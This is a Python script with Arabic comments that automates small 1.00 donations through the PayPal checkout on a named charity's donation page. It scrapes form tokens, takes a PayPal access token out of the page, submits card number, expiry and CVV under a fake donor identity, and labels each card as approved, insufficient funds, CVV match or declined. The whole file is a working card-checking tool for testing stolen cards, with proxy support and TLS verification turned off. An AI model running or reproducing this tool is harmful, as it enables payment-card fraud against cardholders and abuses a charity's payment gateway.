"""
بوابة الدفع: PayPal Charge Single (Water Well)
الموقع: hasene.org.uk
نوع البوابة: PayPal Commerce Platform (GiveWP - Water Well Flow)
تدفق الطلبات:
1. GET /donations/water-well/ -> استخراج hash, id-prefix, form-id, client-token
2. POST /wp-admin/admin-ajax.php (give_process_donation) -> تهيئة عملية التبرع
3. POST /wp-admin/admin-ajax.php (give_paypal_commerce_create_order) -> إنشاء طلب PayPal والحصول على order_id
4. POST https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source -> تأكيد بيانات البطاقة
5. POST /wp-admin/admin-ajax.php (give_paypal_commerce_approve_order) -> الموافقة النهائية وتصنيف النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import re
import base64
import json


async def req1_get_tokens(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str, str, str]:
    """الخطوة 1: استخراج التوكنات والمعرفات اللازمة من صفحة التبرع."""
    headers = {
        "authority": "hasene.org.uk",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(
            "https://hasene.org.uk/donations/water-well/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        hash_match = re.search(r'name="give-form-hash" value="(.*?)"', text)
        pre_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', text)
        give_match = re.search(r'name="give-form-id" value="(.*?)"', text)
        enc_match = re.search(r'"data-client-token":"(.*?)"', text)

        if not all([hash_match, pre_match, give_match, enc_match]):
            raise RuntimeError("Failed to extract tokens from page")

        client_token_enc = enc_match.group(1)
        decoded_bytes = base64.b64decode(client_token_enc)
        decoded_text = decoded_bytes.decode("utf-8")
        
        access_token_match = re.search(r'"accessToken":"(.*?)"', decoded_text)
        if not access_token_match:
            raise RuntimeError("Failed to extract access token from client token")

        return (
            hash_match.group(1),
            pre_match.group(1),
            give_match.group(1),
            access_token_match.group(1),
        )
    except Exception as e:
        raise RuntimeError(f"req1_get_tokens failed: {e}") from e


async def req2_init_donation(
    session: aiohttp.ClientSession,
    form_hash: str,
    form_prefix: str,
    form_id: str,
    proxy_url: str = None,
) -> None:
    """الخطوة 2: تهيئة عملية التبرع في الموقع."""
    headers = {
        "authority": "hasene.org.uk",
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://hasene.org.uk/donations/water-well/",
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "give-honeypot": "",
        "give-form-id-prefix": form_prefix,
        "give-form-id": form_id,
        "give-form-title": "Water Well",
        "give-current-url": "https://hasene.org.uk/donations/water-well/",
        "give-form-url": "https://hasene.org.uk/donations/water-well/",
        "give-form-minimum": "10.00",
        "give-form-maximum": "499.00",
        "give-form-hash": form_hash,
        "give-price-id": "0",
        "give_recurring_donation_details": '{"is_recurring":false}',
        "give-amount": "1.00",
        "payment-mode": "paypal-commerce",
        "give_first": "John",
        "give_last": "Doe",
        "give_email": f"johndoe{uuid.uuid4().hex[:6]}@gmail.com",
        "give_action": "purchase",
        "give-gateway": "paypal-commerce",
        "action": "give_process_donation",
        "give_ajax": "true",
    }
    try:
        async with session.post(
            "https://hasene.org.uk/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            await r.text()
    except Exception as e:
        raise RuntimeError(f"req2_init_donation failed: {e}") from e


async def req3_create_paypal_order(
    session: aiohttp.ClientSession,
    form_hash: str,
    form_prefix: str,
    form_id: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: إنشاء طلب PayPal والحصول على order_id."""
    params = {"action": "give_paypal_commerce_create_order"}
    # استخدام Multipart form data كما في الكود الأصلي
    data = aiohttp.FormData()
    data.add_field("give-form-id-prefix", form_prefix)
    data.add_field("give-form-id", form_id)
    data.add_field("give-form-hash", form_hash)
    data.add_field("payment-mode", "paypal-commerce")
    data.add_field("give-gateway", "paypal-commerce")
    data.add_field("give-amount", "1.00")

    try:
        async with session.post(
            "https://hasene.org.uk/wp-admin/admin-ajax.php",
            params=params,
            data=data,
            proxy=proxy_url,
        ) as r:
            res_json = await r.json(content_type=None)
            order_id = res_json.get("data", {}).get("id")
            if not order_id:
                raise RuntimeError("Failed to create PayPal order ID")
            return order_id
    except Exception as e:
        raise RuntimeError(f"req3_create_paypal_order failed: {e}") from e


async def req4_confirm_payment(
    session: aiohttp.ClientSession,
    order_id: str,
    access_token: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> None:
    """الخطوة 4: تأكيد بيانات البطاقة لدى PayPal."""
    headers = {
        "authority": "cors.api.paypal.com",
        "authorization": f"Bearer {access_token}",
        "content-type": "application/json",
        "referer": "https://assets.braintreegateway.com/",
    }
    json_data = {
        "payment_source": {
            "card": {
                "number": cc,
                "expiry": f"20{ano}-{mes}",
                "security_code": cvv,
                "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}},
            }
        },
        "application_context": {"vault": False},
    }
    try:
        url = f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source"
        async with session.post(
            url, headers=headers, json=json_data, proxy=proxy_url
        ) as r:
            await r.text()
    except Exception as e:
        raise RuntimeError(f"req4_confirm_payment failed: {e}") from e


async def req5_approve_order(
    session: aiohttp.ClientSession,
    order_id: str,
    form_hash: str,
    form_prefix: str,
    form_id: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 5: الموافقة النهائية على الطلب في الموقع."""
    params = {
        "action": "give_paypal_commerce_approve_order",
        "order": order_id,
    }
    data = aiohttp.FormData()
    data.add_field("give-form-id-prefix", form_prefix)
    data.add_field("give-form-id", form_id)
    data.add_field("give-form-hash", form_hash)
    data.add_field("payment-mode", "paypal-commerce")
    
    try:
        async with session.post(
            "https://hasene.org.uk/wp-admin/admin-ajax.php",
            params=params,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req5_approve_order failed: {e}") from e


async def process_paypal_single(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة PayPal Charge Single (Water Well)."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=25)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # 1. Get Tokens
            form_hash, form_prefix, form_id, access_token = await req1_get_tokens(session, proxy_url)
            
            # 2. Init Donation
            await req2_init_donation(session, form_hash, form_prefix, form_id, proxy_url)
            
            # 3. Create Order
            order_id = await req3_create_paypal_order(session, form_hash, form_prefix, form_id, proxy_url)
            
            # 4. Confirm Payment
            await req4_confirm_payment(session, order_id, access_token, cc, mes, ano, cvv, proxy_url)
            
            # 5. Approve Order
            response_text = await req5_approve_order(session, order_id, form_hash, form_prefix, form_id, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    rt_lower = response_text.lower()
    if "thank you" in rt_lower or "success" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "insufficient funds" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "security code is incorrect" in rt_lower or "cvv" in rt_lower:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN/CVV Match"
    elif "declined" in rt_lower:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    else:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Transaction Failed"
